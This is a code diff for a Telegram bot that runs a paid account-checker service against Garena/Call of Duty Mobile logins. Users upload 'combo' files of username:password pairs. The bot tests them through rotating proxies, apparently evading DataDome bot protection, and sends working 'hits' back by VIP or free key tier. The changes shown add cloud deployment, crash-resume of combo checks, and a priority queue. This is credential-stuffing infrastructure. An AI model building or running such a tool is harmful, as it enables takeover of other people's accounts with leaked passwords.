+    # Individual combo files are removed by _remove_active_session() when checks complete
+
 
 # ══════════════════════════════════════════════════════════════
 #  BOT CONFIG  — loaded from config.json, or asked on first run
 # ══════════════════════════════════════════════════════════════
 CONFIG_FILE = "config.json"
 
-def _load_config() -> dict:
-    """Load config.json if it exists, otherwise return empty dict."""
-    if os.path.exists(CONFIG_FILE):
+# ── Railway / cloud deployment support ──────────────────────────────
+# Environment variables take priority over config.json — this ensures
+# the bot can start on Railway (ephemeral FS) without the setup wizard.
+def _is_railway() -> bool:
+    """Detect if running on Railway (or similar cloud platform)."""
+    return bool(os.environ.get("RAILWAY_SERVICE_ID") or os.environ.get("RAILWAY_PROJECT_ID") or os.environ.get("RAILWAY_ENVIRONMENT"))
+
+def _env_config() -> dict:
+    """Build a config dict from environment variables (if set)."""
+    cfg = {}
+    if os.environ.get("BOT_TOKEN"):
+        cfg["bot_token"] = os.environ["BOT_TOKEN"].strip()
+    if os.environ.get("OWNER_ID"):
         try:
-            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
+            cfg["owner_id"] = int(os.environ["OWNER_ID"].strip())
+        except ValueError:
             pass
-    return {}
+    if os.environ.get("OWNER_USERNAME"):
+        cfg["owner_username"] = os.environ["OWNER_USERNAME"].strip().lstrip("@")
+    if os.environ.get("COOWNER_IDS"):
+        try:
+            cfg["coowner_ids"] = [int(x.strip()) for x in os.environ["COOWNER_IDS"].split(",") if x.strip().lstrip("-").isdigit()]
+        except ValueError:
+            pass
+    if os.environ.get("KEYSYSTEM_URL"):
+        cfg["keysystem_url"] = os.environ["KEYSYSTEM_URL"].strip()
+    if os.environ.get("KEYSYSTEM_ADMIN_SECRET"):
+        cfg["keysystem_admin_secret"] = os.environ["KEYSYSTEM_ADMIN_SECRET"].strip()
+    return cfg
+
+def _load_config() -> dict:
+    """Load config: config.json first, then env vars as fallback, then KeyVault state."""
+    # Guard against circular calls (KeySystemAPI.__init__ calls _load_config)
+    if getattr(_load_config, "_in_progress", False):
+        return {}
+    _load_config._in_progress = True
+    try:
+        cfg = {}
+        # 1. Try config.json on disk
+        if os.path.exists(CONFIG_FILE):
+            try:
+                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
+                    cfg = json.load(f)
+            except Exception:
+                pass
+        # 2. Overlay with environment variables (they take priority)
+        env_cfg = _env_config()
+        if env_cfg:
+            cfg.update(env_cfg)
+        # 3. If still missing critical fields, try KeyVault API (survives redeploy)
+        if not cfg.get("bot_token") or not cfg.get("owner_id"):
+            try:
+                api = _get_keysystem_api()
+                if api and api.enabled:
+                    remote_cfg = api.load_state("bot_config")
+                    if isinstance(remote_cfg, dict):
+                        for k, v in remote_cfg.items():
+                            if k not in cfg or not cfg[k]:
+                                cfg[k] = v
+                        logger.info("[CONFIG] Loaded fallback config from KeyVault API")
+            except Exception as e:
+                logger.debug(f"[CONFIG] KeyVault config fallback failed: {e}")
+        return cfg
+    finally:
+        _load_config._in_progress = False
 
 def _save_config(cfg: dict):
-    """Persist config to config.json."""
+    """Persist config to config.json AND sync to KeyVault API for Railway persistence."""
     with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(cfg, f, indent=2)
     print(f"\033[92m✅ Config saved to {CONFIG_FILE}\033[0m")
+    # Also sync to KeyVault API so config survives Railway redeploy
+    try:
+        api = _get_keysystem_api()
+        if api and api.enabled:
+            api.save_state("bot_config", cfg)
+            logger.info("[CONFIG] Synced config to KeyVault API")
+    except Exception as e:
+        logger.debug(f"[CONFIG] KeyVault config sync failed: {e}")
 
 def _validate_token(token: str) -> bool:
     """Quick check — call getMe and verify ok:true."""
@@ -2668,21 +3456,72 @@ def _setup_wizard() -> dict:
 
 def _get_or_create_config() -> dict:
     """
-    Load config from disk.
-    If missing or incomplete, run the setup wizard.
+    Load config from disk / env vars / KeyVault.
+    If missing AND running interactively, run the setup wizard.
+    If missing AND running on Railway (no stdin), wait for env vars instead of crashing.
+    The bot will NEVER call sys.exit() — it stays alive and waits for configuration.
     """
     cfg = _load_config()
     needs_setup = (
         not cfg.get("bot_token") or
         not cfg.get("owner_id")
     )
-    if needs_setup:
+    if not needs_setup:
+        return cfg
+
+    # Config is incomplete — check if we can run the setup wizard
+    if _is_railway() or not sys.stdin.isatty():
+        # ── Railway / no-TTY mode: cannot use input() ──
+        # Instead of crashing, wait for environment variables to be set.
+        # Railway will keep the process alive; once the user sets BOT_TOKEN
+        # and OWNER_ID in the Railway dashboard, the next poll will pick them up.
+        logger.warning("=" * 60)
+        logger.warning("⚠️  BOT_TOKEN and/or OWNER_ID not configured!")
+        logger.warning("   On Railway/cloud, set these environment variables:")
+        logger.warning("     BOT_TOKEN    = your Telegram bot token")
+        logger.warning("     OWNER_ID     = your Telegram numeric user ID")
+        logger.warning("     OWNER_USERNAME = your Telegram username (optional)")
+        logger.warning("     KEYSYSTEM_URL = KeyVault API URL (optional)")
+        logger.warning("     KEYSYSTEM_ADMIN_SECRET = KeyVault admin secret (optional)")
+        logger.warning("   Bot will wait and retry every 30 seconds...")
+        logger.warning("=" * 60)
+        print("\n\033[93m⚠️  BOT_TOKEN and OWNER_ID not configured!\033[0m")
+        print("\033[93m   On Railway: set BOT_TOKEN and OWNER_ID environment variables.\033[0m")
+        print("\033[93m   Bot will wait and retry every 30 seconds...\033[0m\n")
+        # Wait loop — keep checking for env vars instead of exiting
+        while True:
+            time.sleep(30)
+            env_cfg = _env_config()
+            if env_cfg.get("bot_token") and env_cfg.get("owner_id"):
+                # Env vars are now set — merge and return
+                cfg.update(env_cfg)
+                logger.info("[CONFIG] ✅ Environment variables detected — starting bot!")
+                # Also save to config.json for next time
+                _save_config(cfg)
+                return cfg
+            # Also try KeyVault API each cycle
+            try:
+                api = _get_keysystem_api()
+                if api and api.enabled:
+                    remote_cfg = api.load_state("bot_config")
+                    if isinstance(remote_cfg, dict) and remote_cfg.get("bot_token") and remote_cfg.get("owner_id"):
+                        for k, v in remote_cfg.items():
+                            if k not in cfg or not cfg[k]:
+                                cfg[k] = v
+                        logger.info("[CONFIG] ✅ KeyVault config detected — starting bot!")
+                        _save_config(cfg)
+                        return cfg
+            except Exception:
+                pass
+            logger.debug("[CONFIG] Still waiting for BOT_TOKEN and OWNER_ID...")
+    else:
+        # ── Interactive mode: run setup wizard ──
         cfg = _setup_wizard()
     return cfg
 
 # Load (or create) config at startup
 _cfg        = _get_or_create_config()
-BOT_TOKEN   = _cfg["bot_token"]
+BOT_TOKEN   = _cfg.get("bot_token", "")
 
 COMBO_LINE_LIMIT = 1000   # max lines allowed per upload
 
@@ -2852,6 +3691,7 @@ def _tg_set_commands(token: str):
     user_commands = [
         {"command": "start",  "description": "▶️ Start or restore your session"},
         {"command": "help",   "description": "📋 Show menu & your config"},
+        {"command": "check",  "description": "📊 Live stats — level, country, server"},
         {"command": "redeem", "description": "🔑 Redeem an access key"},
         {"command": "reset",  "description": "🔄 Clear settings & reconfigure"},
         {"command": "stop",   "description": "🛑 Stop the running checker"},
@@ -2860,16 +3700,24 @@ def _tg_set_commands(token: str):
     # ── Commands visible ONLY to the owner (private chat scope) ──
     admin_commands = [
         {"command": "help",           "description": "⚙️ Admin panel"},
+        {"command": "check",          "description": "📊 Live stats — level, country, server"},
         {"command": "generate_key",   "description": "🔑 Generate a redeem key"},
         {"command": "statuskey",      "description": "📋 View all key statuses"},
         {"command": "deletekey",      "description": "🗑 Delete key(s)"},
+        {"command": "keysystem",     "description": "🔗 Configure KeyVault API"},
         {"command": "upload_proxy",   "description": "📡 Upload proxy list"},
         {"command": "proxy_done",     "description": "✅ Finish proxy upload & save"},
         {"command": "proxystatus",    "description": "📊 View proxy pool status"},
+        {"command": "testproxy",      "description": "🧪 Test proxy connectivity"},
+        {"command": "deleteproxy",    "description": "🗑️ Delete all proxy files"},
+        {"command": "renewproxy",    "description": "🔄 Renew proxies from worker"},
         {"command": "serverstatus",   "description": "🖥 Server load & limits"},
+        {"command": "setthreads",    "description": "🔧 Set checker threads (e.g. /setthreads 10)"},
+        {"command": "setmaxusers",    "description": "👥 Set max concurrent users (e.g. /setmaxusers 20)"},
         {"command": "add_coowner",    "description": "👥 Add a co-owner by Telegram ID"},
         {"command": "remove_coowner", "description": "👥 Remove a co-owner"},
         {"command": "stopall",        "description": "☢️ Stop ALL running checkers"},
+        {"command": "broadcast",      "description": "📢 Send message to all users"},
         {"command": "resetconfig",    "description": "🔧 Re-run bot setup wizard"},
         {"command": "start",          "description": "▶️ Start / restore session"},
         {"command": "reset",          "description": "🔄 Clear settings"},
@@ -3061,28 +3909,190 @@ _saved_users : dict = {}   # username/chat_id -> saved profile (persisted across
 _saved_lock  = threading.Lock()
 
 USERS_FILE = "bot_users.json"
+ACTIVE_SESSIONS_FILE = "active_sessions.json"
 
 
-def _load_saved_users():
-    """Load saved user profiles from disk."""
+def _load_saved_users(sync_api: bool = False):
+    """Load saved user profiles — local file first, optionally sync from API."""
     global _saved_users
+    # Try loading from local file first
     if os.path.exists(USERS_FILE):
         try:
             with open(USERS_FILE, "r", encoding="utf-8") as f:
                 _saved_users = json.load(f)
         except Exception:
             _saved_users = {}
+    # Sync from KeyVault API (has latest data surviving redeploys)
+    if sync_api:
+        try:
+            api = _get_keysystem_api()
+            if api.enabled:
+                remote = api.load_state("bot_users")
+                if remote and isinstance(remote, dict):
+                    for k, v in remote.items():
+                        if k not in _saved_users:
+                            _saved_users[k] = v
+                    logger.info(f"[BOT] Synced {len(remote)} user profiles from KeyVault API")
+        except Exception as e:
+            logger.warning(f"[BOT] Could not sync users from API: {e}")
 
 def _save_users_to_disk():
-    """Persist all saved user profiles to disk."""
+    """Persist all saved user profiles to disk AND sync to KeyVault API."""
     try:
         with open(USERS_FILE, "w", encoding="utf-8") as f:
             json.dump(_saved_users, f, indent=2)
     except Exception as e:
-        logger.warning(f"[BOT] Could not save users: {e}")
+        logger.warning(f"[BOT] Could not save users to disk: {e}")
+    # Also sync to KeyVault API for persistence across Railway redeploys
+    try:
+        if _keysystem_api and _keysystem_api.enabled:
+            _keysystem_api.save_state("bot_users", _saved_users)
+    except Exception:
+        pass
 
-# Load on startup
-_load_saved_users()
+# Load on startup (wrapped for Railway resilience)
+try:
+    _load_saved_users()
+except Exception as _users_err:
+    logging.getLogger(__name__).warning(f"[BOT] ⚠️  Could not load saved users: {_users_err}")
+
+
+# ── Active session persistence for auto-resume on crash ────────
+_active_sessions: dict = {}  # chat_id -> session info dict
+_resume_notify_ts: dict = {}  # chat_id -> last auto-resume notification timestamp (cooldown)
+_active_sessions_lock = threading.Lock()
+
+
+def _save_active_session(chat_id, file_path: str, file_name: str, lines: list,
+                         user_data: dict, progress: int = 0):
+    """Persist an active checking session to disk for crash recovery.
+    Also saves a copy of the combo file to saved_combos/ so it survives restarts.
+    
+    The 'lines' parameter should contain the REMAINING lines to check.
+    'progress' is the number of lines already processed from the original file.
+    On resume, the bot reads the persistent combo file and skips 'progress' lines
+    to continue from where it left off.
+    """
+    # ── Save combo file to persistent directory ──
+    os.makedirs(SAVED_COMBOS_DIR, exist_ok=True)
+    persistent_path = os.path.join(SAVED_COMBOS_DIR, f"{chat_id}_{file_name}")
+    try:
+        with open(persistent_path, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(lines) + "\n")
+    except Exception as e:
+        logger.warning(f"[BOT] Could not save persistent combo for {chat_id}: {e}")
+        persistent_path = file_path  # fallback to original path
+
+    with _active_sessions_lock:
+        _active_sessions[str(chat_id)] = {
+            "chat_id": chat_id,
+            "file_path": file_path,
+            "persistent_path": persistent_path,
+            "file_name": file_name,
+            "total_lines": len(lines),
+            "progress": progress,
+            "level": user_data.get("level", [1]),
+            "clean_filter": user_data.get("clean_filter", "both"),
+            "hits_id": user_data.get("hits_id", chat_id),
+            "username": user_data.get("username", ""),
+            "combo_limit": user_data.get("combo_limit", COMBO_LINE_LIMIT),
+            "started_at": time.time(),
+        }
+        _flush_active_sessions()
+
+
+def _update_session_progress(chat_id, progress: int):
+    """Update the progress counter for an active session.
+    Also trims the persistent combo file by removing already-processed lines.
+    This ensures that on crash/restart, the file only contains remaining lines,
+    so resume never re-checks already-processed accounts."""
+    with _active_sessions_lock:
+        key = str(chat_id)
+        if key in _active_sessions:
+            _active_sessions[key]["progress"] = progress
+            _flush_active_sessions()
+            # ── Trim persistent combo file: remove processed lines ──
+            # This is the KEY fix — by trimming the file as we go,
+            # on restart the bot only sees remaining lines.
+            persistent_path = _active_sessions[key].get("persistent_path", "")
+            if persistent_path and os.path.exists(persistent_path):
+                try:
+                    with open(persistent_path, "r", encoding="utf-8", errors="ignore") as fh:
+                        all_lines = [l.strip() for l in fh if l.strip() and ":" in l]
+                    remaining = all_lines[progress:]
+                    if len(remaining) < len(all_lines):
+                        with open(persistent_path, "w", encoding="utf-8") as fh:
+                            fh.write("\n".join(remaining) + "\n")
+                        # Update total_lines to reflect remaining
+                        _active_sessions[key]["total_lines"] = len(remaining)
+                        _active_sessions[key]["progress"] = 0  # reset since file is now trimmed
+                        _flush_active_sessions()
+                except Exception as e:
+                    logger.debug(f"[BOT] Could not trim persistent combo for {chat_id}: {e}")
+
+
+def _remove_active_session(chat_id, delete_combo=True):
+    """Remove a completed/stopped session from disk.
+    Also removes the persistent combo file unless delete_combo=False."""
+    key = str(chat_id)
+    with _active_sessions_lock:
+        sess = _active_sessions.pop(key, None)
+        _flush_active_sessions()
+    # Clean up persistent combo file
+    if delete_combo and sess:
+        ppath = sess.get("persistent_path", "")
+        if ppath and os.path.exists(ppath):
+            try:
+                os.remove(ppath)
+                logger.debug(f"[BOT] Removed persistent combo: {ppath}")
+            except Exception:
+                pass
+        # Also try the default naming pattern
+        fname = sess.get("file_name", "")
+        if fname:
+            default_path = os.path.join(SAVED_COMBOS_DIR, f"{chat_id}_{fname}")
+            if os.path.exists(default_path) and default_path != ppath:
+                try:
+                    os.remove(default_path)
+                except Exception:
+                    pass
+
+
+def _flush_active_sessions():
+    """Write active sessions to disk AND sync to API (called under lock)."""
+    try:
+        with open(ACTIVE_SESSIONS_FILE, "w", encoding="utf-8") as f:
+            json.dump(_active_sessions, f, indent=2)
+    except Exception as e:
+        logger.warning(f"[BOT] Could not save active sessions: {e}")
+    # Sync to KeyVault API for persistence across Railway redeploys
+    try:
+        if _keysystem_api and _keysystem_api.enabled:
+            _keysystem_api.save_state("active_sessions", _active_sessions)
+    except Exception:
+        pass
+
+
+def _load_active_sessions() -> dict:
+    """Load active sessions — try local first, merge from API."""
+    result = {}
+    if os.path.exists(ACTIVE_SESSIONS_FILE):
+        try:
+            with open(ACTIVE_SESSIONS_FILE, "r", encoding="utf-8") as f:
+                result = json.load(f)
+        except Exception:
+            pass
+    # Also check API for sessions saved before redeploy
+    try:
+        if _keysystem_api and _keysystem_api.enabled:
+            remote = _keysystem_api.load_state("active_sessions")
+            if remote and isinstance(remote, dict):
+                for k, v in remote.items():
+                    if k not in result:
+                        result[k] = v
+    except Exception:
+        pass
+    return result
 
 
 def _udata(chat_id) -> dict:
@@ -3116,6 +4126,7 @@ def _save_profile(chat_id, d: dict):
             "key":          d.get("key"),
             "key_expires":  d.get("key_expires", 0),
             "combo_limit":  d.get("combo_limit", COMBO_LINE_LIMIT),
+            "key_tier":     d.get("key_tier", "free"),
         }
         if d.get("username"):
             _saved_users[d["username"].lstrip("@").lower()] = _saved_users[key]
@@ -3143,6 +4154,7 @@ def _handle_start(token: str, chat_id, from_user: dict):
         d["key"]          = saved.get("key")
         d["key_expires"]  = saved.get("key_expires", 0)
         d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)
+        d["key_tier"]     = saved.get("key_tier", "free")
 
         lvl_label  = "ALL levels" if d["level"] == [1] else f"Level {d['level'][0]}+"
         cf_map     = {"clean": "✅ CLEAN only", "notclean": "❌ NOT CLEAN only", "both": "🔄 BOTH"}
@@ -3153,6 +4165,8 @@ def _handle_start(token: str, chat_id, from_user: dict):
         vip_badge = " ⭐ VIP" if is_vip else ""
 
         _bot_state[chat_id] = "AWAIT_FILE"
+        # Clear any proxy-paused state from previous session
+        _unregister_proxy_paused(chat_id)
 
         _tg_send(token, chat_id,
             f"👋 <b>Welcome back, {name}!</b>{vip_badge}\n\n"
@@ -3289,6 +4303,9 @@ def _handle_filter(token: str, chat_id, text: str):
 
 # ── Step 4: file upload ────────────────────────────────────────
 def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
+    # Clear any previous proxy-paused state for this user (they're re-uploading)
+    _unregister_proxy_paused(chat_id)
+
     document = message.get("document")
     if not document:
         _tg_send(token, chat_id,
@@ -3298,6 +4315,18 @@ def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
         return
 
     file_name: str = document.get("file_name", "combo.txt")
+    file_size: int = document.get("file_size", 0)  # Telegram provides size in bytes
+    MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB limit
+
+    # ── File size check ──────────────────────────────────────
+    if file_size > MAX_FILE_SIZE:
+        size_mb = file_size / (1024 * 1024)
+        _tg_send(token, chat_id,
+            f"❌ <b>File too large!</b>\n\n"
+            f"Your file <code>{file_name}</code> is <b>{size_mb:.1f} MB</b>.\n"
+            f"Maximum allowed: <b>5 MB</b>\n\n"
+            f"<i>Please split your file into smaller parts and try again.</i>")
+        return
 
     # ── Smart filename detection ───────────────────────────────
     # Accept any .txt file whose name contains "garena" or "codm"
@@ -3424,8 +4453,33 @@ def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
     cf_map    = {"clean": "✅ CLEAN", "notclean": "❌ NOT CLEAN", "both": "🔄 BOTH"}
     user_telegram_config = (BOT_TOKEN, str(hits_id), d["level"], "", d["clean_filter"])
 
+    # ── If no proxies: save combo and register as proxy-paused ──
+    _is_owner_user = _is_owner(from_user) if from_user else False
+    if not _has_proxies() and not _is_owner_user:
+        _register_proxy_paused(chat_id, clean_path, file_name, clean_lines, d)
+        with _state_lock:
+            _bot_state[chat_id] = "AWAIT_FILE"
+        _tg_send(token, chat_id,
+            f"📄 <b>File received & saved!</b>\n\n"
+            f"<code>{file_name}</code> — {len(clean_lines)} accounts\n\n"
+            f"⏳ <b>No proxies available right now.</b>\n"
+            f"Your check will <b>auto-resume</b> as soon as proxies are back!\n\n"
+            f"<i>You don\'t need to re-upload. Just wait — I\'ll notify you.</i>"
+        )
+        # Clean up the temp combo/ files (persistent copy is in saved_combos/)
+        for p in (save_path, clean_path):
+            try:
+                if p and os.path.exists(p):
+                    os.remove(p)
+            except Exception:
+                pass
+        return
+
     with _state_lock:
         _bot_state[chat_id] = "RUNNING"
+
+    # ── Save active session for auto-resume on crash ───────────
+    _save_active_session(chat_id, clean_path, file_name, clean_lines, d)
 
     # ── Create a per-user stop event ───────────────────────────
     stop_evt = threading.Event()
@@ -3444,7 +4498,9 @@ def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
         f"🎮 <b>Level:</b> <code>{lvl_label}</code>  "
         f"🔍 <b>Hits:</b> <code>{cf_map[d['clean_filter']]}</code>\n"
         f"📩 <b>Sending hits to:</b> <code>{hits_id}</code>\n"
-        f"📦 <b>Limit:</b> <code>{limit_display}</code>\n\n"
+        f"📦 <b>Limit:</b> <code>{limit_display}</code>\n"
+        f"🧵 <b>Threads:</b> <code>{VIP_THREADS_PER_USER if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else FREE_THREADS_PER_USER}</code>"
+        f"{'  ⭐ VIP (no queue)' if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else '  🆓 Free (queued)'}\n\n"
         f"<i>Hits will appear as they come in... Send /stop to cancel.</i>"
     )
 
@@ -3531,6 +4587,8 @@ def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
                 _bot_state[chat_id] = "AWAIT_FILE"
             with _stop_events_lock:
                 _stop_events.pop(chat_id, None)
+            # Remove from active sessions (no longer needs resume)
+            _remove_active_session(chat_id)
 
             if stopped:
                 _tg_send(token, chat_id,
@@ -3657,10 +4715,16 @@ def _render_bars():
     Single background thread — redraws all active progress bars in-place.
     Style matches Image 2:  id:XXXXXXXXX [████░░░░░░░] 32.3%  97/300  1/s
     One line per user. Nothing else prints to terminal in BOT_MODE.
+
+    On non-TTY (Railway logs), only prints a summary line every 5 seconds
+    to avoid log spam. On a real terminal, uses ANSI in-place refresh.
     """
     import sys
 
     BAR_LEN = 30          # bar width in chars
+    IS_TTY  = sys.stdout.isatty()  # Railway logs are NOT a TTY
+    REFRESH = 0.5 if IS_TTY else 5.0  # 0.5s on TTY, 5s on logs
+    _last_log_time = 0
 
     # ANSI colours
     CYAN   = "\033[1;96m"
@@ -3671,7 +4735,7 @@ def _render_bars():
     RESET  = "\033[0m"
 
     while True:
-        time.sleep(0.1)
+        time.sleep(REFRESH)
         with _bars_lock:
             bars = list(_active_bars.items())
 
@@ -3697,22 +4761,34 @@ def _render_bars():
             )
             lines.append(line)
 
-        prev = _prev_bar_count[0]
-        out  = ""
-
-        if prev > 0:
-            out += f"\033[{prev}A"   # move cursor up to overwrite previous bars
-
-        for line in lines:
-            out += f"\033[2K{line}\n"
-
-        # Clear any leftover lines from a previous larger count
-        for _ in range(max(0, prev - len(lines))):
-            out += "\033[2K\n"
-
-        sys.stdout.write(out)
-        sys.stdout.flush()
-        _prev_bar_count[0] = len(lines)
+        if IS_TTY:
+            # Real terminal: use ANSI cursor movement to overwrite in-place
+            prev = _prev_bar_count[0]
+            out  = ""
+            if prev > 0:
+                out += f"\033[{prev}A"   # move cursor up to overwrite previous bars
+            for line in lines:
+                out += f"\033[2K{line}\n"
+            # Clear any leftover lines from a previous larger count
+            for _ in range(max(0, prev - len(lines))):
+                out += "\033[2K\n"
+            sys.stdout.write(out)
+            sys.stdout.flush()
+            _prev_bar_count[0] = len(lines)
+        else:
+            # Non-TTY (Railway logs): just print a compact single-line summary
+            # to avoid spamming the log with hundreds of lines
+            now = time.time()
+            if now - _last_log_time >= 5.0:
+                summary_parts = []
+                for cid, b in bars:
+                    done  = b["done"]
+                    total = b["total"]
+                    speed = b["speed"]
+                    pct   = done / total * 100 if total else 0
+                    summary_parts.append(f"id:{cid} {pct:.0f}% {done}/{total} {speed}/s")
+                logger.info(f"[PROGRESS] {' | '.join(summary_parts)}")
+                _last_log_time = now
 
 
 # Start the renderer once (daemon — dies with the main process)
@@ -3720,12 +4796,30 @@ threading.Thread(target=_render_bars, daemon=True).start()
 
 
 class _BotLogFilter(logging.Filter):
-    """In BOT_MODE: drop ALL log output — progress bar is the only terminal output.
-    Nothing from processaccount, prelogin, login, proxy rotation etc. should print."""
+    """In BOT_MODE: drop most log output but allow important system messages through.
+    Proxy fetch, HEARTBEAT, and error-level messages are always shown."""
+    # Prefixes that should always be visible even in BOT_MODE
+    ALLOWED_PREFIXES = (
+        "[RAW-PROXY]",
+        "[PROXY-VAL]",
+        "[HEARTBEAT]",
+        "[MAIN]",
+        "[DATADOME]",
+    )
+
     def filter(self, record):
-        if BOT_MODE:
-            return False   # drop everything — progress bar handles display
-        return True
+        if not BOT_MODE:
+            return True
+        # Always allow ERROR and CRITICAL level messages
+        if record.levelno >= logging.ERROR:
+            return True
+        # Allow specific important prefixes
+        msg = record.getMessage()
+        for prefix in self.ALLOWED_PREFIXES:
+            if prefix in msg:
+                return True
+        # Drop everything else (per-account noise, proxy rotation, etc.)
+        return False
 
 
 # Attach the filter to every handler on the root logger
@@ -3737,6 +4831,187 @@ def _apply_bot_log_filter():
     root.addFilter(f)
 
 _apply_bot_log_filter()
+
+
+# ──────────────────────────────────────────────────────────────
+#  VIP/FREE PRIORITY QUEUE SYSTEM
+#  ── VIP keys: NO queue — instant processing, dedicated threads
+#  ── Free keys: HAVE queue — wait in line for limited slots
+#  ── Semaphore-first design prevents race conditions
+# ──────────────────────────────────────────────────────────────
+
+from queue import Queue as _ThreadQueue
+
+class VipFreeQueue:
+    """
+    Priority queue for VIP/Free account processing.
+    
+    - VIP accounts: NO queue — workers acquire semaphore (always available),
+      then grab account. Since # VIP workers = vip_threads, semaphore never
+      blocks → instant processing.
+    - Free accounts: HAVE queue — workers acquire semaphore FIRST (blocks if
+      all free_threads slots taken = QUEUE), then grab account. This IS the
+      queue mechanism.
+    
+    CRITICAL: Semaphore is acquired BEFORE pulling from queue.
+    This prevents the race condition where a worker pulls an account but
+    then blocks on the semaphore, making that account invisible.
+    """
+
+    def __init__(self, vip_threads: int, free_threads: int):
+        self.vip_queue = _ThreadQueue()
+        self.free_queue = _ThreadQueue()
+        self._lock = threading.Lock()
+        self._vip_added = 0
+        self._free_added = 0
+        self._vip_done = 0
+        self._free_done = 0
+        self._total = 0
+        self._done = 0
+        self._stop_event = threading.Event()
+        self.vip_threads = vip_threads
+        self.free_threads = free_threads
+
+        # VIP semaphore: matches # of VIP workers → never blocks (no queue)
+        # Free semaphore: limits concurrent Free workers → THIS IS THE QUEUE
+        self._vip_sem = threading.Semaphore(vip_threads)
+        self._free_sem = threading.Semaphore(free_threads)
+
+        # Track accounts "in flight" (pulled from queue but not yet done)
+        self._vip_in_flight = 0
+        self._free_in_flight = 0
+
+    def add_vip(self, account: dict):
+        """Add VIP account — NO queue, goes straight to processing."""
+        with self._lock:
+            self._vip_added += 1
+            self._total += 1
+        self.vip_queue.put(account)
+
+    def add_free(self, account: dict):
+        """Add Free account — goes into the queue, waits for available slot."""
+        with self._lock:
+            self._free_added += 1
+            self._total += 1
+        self.free_queue.put(account)
+
+    def acquire_vip_slot(self, timeout: float = None) -> bool:
+        """Acquire a VIP processing slot. Returns True if acquired."""
+        return self._vip_sem.acquire(timeout=timeout)
+
+    def release_vip_slot(self):
+        """Release a VIP processing slot."""
+        self._vip_sem.release()
+
+    def acquire_free_slot(self, timeout: float = None) -> bool:
+        """Acquire a Free processing slot. BLOCKS if all free slots taken = QUEUE."""
+        return self._free_sem.acquire(timeout=timeout)
+
+    def release_free_slot(self):
+        """Release a Free processing slot."""
+        self._free_sem.release()
+
+    def get_vip(self):
+        """Get next VIP account (non-blocking). Returns None if empty."""
+        try:
+            account = self.vip_queue.get_nowait()
+            with self._lock:
+                self._vip_in_flight += 1
+            return account
+        except Exception:
+            return None
+
+    def get_free(self):
+        """Get next Free account (non-blocking). Returns None if empty."""
+        try:
+            account = self.free_queue.get_nowait()
+            with self._lock:
+                self._free_in_flight += 1
+            return account
+        except Exception:
+            return None
+
+    def mark_vip_done(self):
+        with self._lock:
+            self._vip_done += 1
+            self._done += 1
+            self._vip_in_flight = max(0, self._vip_in_flight - 1)
+
+    def mark_free_done(self):
+        with self._lock:
+            self._free_done += 1
+            self._done += 1
+            self._free_in_flight = max(0, self._free_in_flight - 1)
+
+    @property
+    def vip_pending(self):
+        return self.vip_queue.qsize()
+
+    @property
+    def free_pending(self):
+        return self.free_queue.qsize()
+
+    @property
+    def vip_remaining(self):
+        """Accounts still in queue + in flight."""
+        with self._lock:
+            return self.vip_queue.qsize() + self._vip_in_flight
+
+    @property
+    def free_remaining(self):
+        """Accounts still in queue + in flight."""
+        with self._lock:
+            return self.free_queue.qsize() + self._free_in_flight
+
+    @property
+    def progress(self):
+        with self._lock:
+            if self._total == 0:
+                return 0
+            return (self._done / self._total) * 100
+
+    def all_done(self):
+        """True when every added account has been fully processed."""
+        with self._lock:
+            return self._done >= self._total and self._total > 0
+
+    def stop(self):
+        self._stop_event.set()
+
+    def should_stop(self):
+        return self._stop_event.is_set()
+
+
+def _get_user_tier(chat_id) -> str:
+    """
+    Get the key tier for a user: 'vip' or 'free'.
+    Returns 'vip' if user has a valid vip-tier key, 'free' otherwise.
+    Also caches tier in user data so we don't have to look up the key every time.
+    """
+    d = _udata(chat_id)
+    # Check cached tier first
+    cached_tier = d.get("key_tier")
+    key = d.get("key")
+    key_expires = d.get("key_expires", 0)
+    
+    # If key is valid, look up its tier from the keys store
+    if key and time.time() < key_expires:
+        keys = _load_keys()
+        entry = keys.get(key)
+        if entry:
+            tier = entry.get("tier", "free")
+            # Cache it
+            d["key_tier"] = tier
+            return tier
+        # Key not in store — check saved profile
+        saved = _get_saved_profile(str(chat_id))
+        if saved and saved.get("key_tier"):
+            tier = saved["key_tier"]
+            d["key_tier"] = tier
+            return tier
+    
+    # No valid key — return 'free' (unregistered users are free tier)
+    return cached_tier or "free"
 
 
 def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, label: str = "user", stop_event=None) -> tuple:
@@ -3766,13 +5041,35 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
         return {}, result_folder
 
     total            = len(accounts)
-    MAX_THREADS      = MAX_THREADS_PER_USER   # use global setting
+    # ── Determine user tier: VIP = no queue, Free = queued ──
+    is_owner = (chat_id == OWNER_ID or chat_id in COOWNER_IDS) if chat_id else False
+    is_vip = _is_vip_user(chat_id) if chat_id else False
+    user_tier = _get_user_tier(chat_id) if chat_id else "free"
+    # Owner always counts as VIP tier
+    if is_owner:
+        user_tier = "vip"
+        is_vip = True
+
+    # ── Pick thread count based on tier ──
+    # VIP: VIP_THREADS_PER_USER threads, NO QUEUE — instant processing
+    # Free: FREE_THREADS_PER_USER threads, HAS QUEUE — waits for slot
+    if user_tier == "vip" or is_vip or is_owner:
+        vip_threads = VIP_THREADS_PER_USER
+        free_threads = 0
+    else:
+        vip_threads = 0
+        free_threads = FREE_THREADS_PER_USER
+
+    tier_label = "⭐ VIP (no queue)" if (user_tier == "vip" or is_vip or is_owner) else "🆓 Free (queued)"
+    logger.info(f"[CHECKER] {label} → VIP:{vip_threads} Free:{free_threads} threads ({tier_label})")
     cookie_manager   = CookieManager()
     live_stats       = LiveStats()
     live_stats.start_tracking(total)
     print_lock       = threading.Lock()
     thread_local     = threading.local()
     thread_init_lock = threading.Lock()
